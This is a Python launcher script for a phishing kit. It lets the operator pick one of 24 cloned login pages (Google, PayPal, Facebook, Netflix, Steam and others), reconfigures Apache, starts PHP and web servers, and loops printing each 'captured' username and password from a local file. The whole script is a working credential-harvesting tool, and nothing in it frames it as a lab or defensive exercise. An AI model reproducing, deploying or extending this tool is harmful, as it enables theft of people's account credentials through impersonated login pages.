#!/usr/bin/python3
import os
import time
from signal import signal, SIGINT

sites = {
    "1": "adobe",
    "2": "badoo",
    "3": "devianart",
    "4": "google",
    "5": "instafollowers",
    "6": "instagram",
    "7": "linkedin",
    "8": "messenger",
    "9": "microsoft",
    "10": "myspace",
    "11": "netflix",
    "12": "paypal",
    "13": "pinterest",
    "14": "shopify",
    "15": "spotify",
    "16": "twitch",
    "17": "twitter",
    "18": "snapchat",
    "19": "verizon",
    "20": "wordpress",
    "21": "yahoo",
    "22": "steam",
    "23": "facebook",
    "24": "tcu"
}

print("Website options:")
print("[1]  Adobe               [11] Netflix            [21] Yahoo")
print("[2]  Badoo               [12] PayPal             [22] Steam")
print("[3]  DevianArt           [13] Pinterest          [23] Facebook")
print("[4]  Google              [14] Shopify            [24] TCU")
print("[5]  Instafollowers      [15] Spotify")
print("[6]  Instagram           [16] Twitch")
print("[7]  LinkedIn            [17] Twitter")
print("[8]  Messenger           [18] Snapchat")
print("[9]  Microsoft           [19] Verizon")
print("[10] Myspace             [20] Wordpress")

web_num = input("\nPlease enter a number: ")
website = sites[web_num]

# 
print("\nSetting up DocumentRoot for apache...")
os.system("sed -i 's!/phish/sites/.*\"!/phish/sites/{}\"!g' /etc/apache2/httpd.conf".format(website))
os.system("sed -i 's!/var/www/localhost/htdocs!/phish/sites/{}!g' /etc/apache2/httpd.conf".format(website))

# Start the PHP server in the background
print("Starting php server...")
os.system("chmod 777 /phish/sites/{}".format(website))  # Add permissions for the php files to read and write
os.system("cd /phish/sites/{}/ && php -S 127.0.0.1:80 > /dev/null 2&>1 & sleep 2".format(website))

# Start the web server in the background
print("Starting web server...\n")
os.system("httpd 2> /dev/null")
time.sleep(2)

print("Open 'localhost:3333' on your local machine.\n")

# Signal handler for CTRL+C
def handler(signal_received, frame):
    print("\nCaptured credentials stored in /phish/sites/{}/usernames.txt".format(website))
    exit(0)

# Activate the signal handler
signal(SIGINT, handler)

# Infinite loop that prints any new credentials that are captured by the server
print("Waiting for credentials...")
count = 0
while 1:
    if os.path.exists("/phish/sites/{}/usernames.txt".format(website)):
        creds = open("/phish/sites/{}/usernames.txt".format(website)).read().split("\n")
        if (count < len(creds)):
            if creds[count - 1] != "":
                print("New credentials captured: " + creds[count - 1])
            count += 1
    time.sleep(2)